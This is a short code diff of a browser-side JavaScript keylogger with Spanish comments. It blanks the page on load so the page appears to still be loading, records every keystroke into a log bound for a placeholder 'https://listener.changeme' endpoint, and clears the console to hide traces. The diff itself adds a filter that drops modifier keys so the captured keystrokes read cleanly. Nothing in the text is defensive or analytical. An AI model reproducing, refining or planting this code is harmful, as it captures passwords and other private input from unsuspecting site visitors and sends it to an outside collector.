@@ -1,6 +1,7 @@
 //Esto lo dejo así para cambiarlo por consola
 var https_listener_for_logging = 'https://listener.changeme'
 var log = ''
+var ignoredKeys = ['Shift', 'CapsLock', 'Tab', 'Control', 'Alt']
 document.addEventListener('DOMContentLoaded', function () {
     // Borramos el contenido para que parezca que sigue cargando
     document.body.innerHTML = '';
@@ -29,7 +30,8 @@ document.addEventListener('DOMContentLoaded', function () {
             );
 
             window.addEventListener("keydown", function (e) {
-                log = log + e.key
+                if (!ignoredKeys.includes(e.key))
+                    log = log + e.key
             });
             console.clear();
         })
